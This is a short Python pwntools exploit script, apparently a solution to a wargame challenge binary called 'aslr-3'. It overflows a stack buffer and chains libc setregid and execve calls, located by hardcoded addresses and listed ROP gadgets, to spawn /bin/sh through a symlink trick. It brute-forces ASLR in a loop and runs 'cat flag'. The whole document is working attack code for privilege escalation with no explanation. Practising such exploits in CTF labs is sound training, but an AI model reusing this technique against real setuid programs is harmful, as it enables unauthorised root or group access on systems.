#!/usr/bin/env python

from pwn import *
import os
import struct

"""
0x8048034:      "\006"
"""

if os.path.exists("\06"):
    os.unlink("\06")
os.symlink("/bin/sh", "\x06");


"""
0xb7dfcda0 <__libc_system>
0xb7e727e0 <execve>
0xb7ea15f0 <__setregid>
"""
execve = p32(0xb7e727e0)
setregid = p32(0xb7ea15f0)

"""
0x0804866b : pop ebp ; ret
0x08048668 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804838d : pop ebx ; ret
0x080485fc : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804866a : pop edi ; pop ebp ; ret
0x08048669 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_pop_ret = p32(0x0804866a)

buf = "A"*0x88 + "BBBB"
buf += setregid
buf += pop_pop_ret
buf += p32(50409)
buf += p32(50409)

string = p32(0x8048034)

buf += execve
buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)



i = 0

while True:
    p=process('./aslr-3')
    print('sending: ', buf)
    print(i)
    i = i+1
    p.sendline(buf)
    p.recvuntil('print?\n')
    p.sendline('cat flag')
    p.interactive()
    p.close()

